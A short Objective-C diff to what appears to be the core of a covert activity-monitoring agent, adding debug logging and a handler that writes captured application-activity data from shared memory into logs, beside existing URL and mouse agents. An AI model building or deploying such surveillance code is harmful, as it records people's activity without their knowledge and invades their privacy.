@@ -45,6 +45,7 @@
 
 #define ICON_FILENAME  @"q45tyh"
 
+//#define DEBUG_CORE
 
 //
 // Old notification system
@@ -716,6 +717,9 @@ static void computerWillShutdown(CFMachPortRef port,
         {
           shMemLog = (shMemoryLog *)[readData bytes];
           
+#ifdef DEBUG_CORE         
+          NSLog(@"%s: Logging shMemLog->agentID = 0x%x", __FUNCTION__, shMemLog->agentID);
+#endif          
           switch (shMemLog->agentID)
             {
             case AGENT_URL:
@@ -753,6 +757,27 @@ static void computerWillShutdown(CFMachPortRef port,
 #endif
                   }
             
+                break;
+              }
+            case AGENT_APPLICATION:
+              {
+                logData = [[NSMutableData alloc] initWithBytes: shMemLog->commandData
+                                                        length: shMemLog->commandDataSize];
+                
+                if ([_logManager writeDataToLog: logData
+                                       forAgent: AGENT_APPLICATION
+                                      withLogID: 0] == TRUE)
+                {
+#ifdef DEBUG_CORE
+                  NSLog(@"%s: Log header agentID %x, status %x command size %d", 
+                          __FUNCTION__,
+                          shMemLog->agentID, 
+                          shMemLog->status,
+                          shMemLog->commandDataSize);
+                  NSLog(@"%s: header data size %d", __FUNCTION__, sizeof(shMemoryLog));
+#endif
+                }
+                
                 break;
               }
             case AGENT_MOUSE:
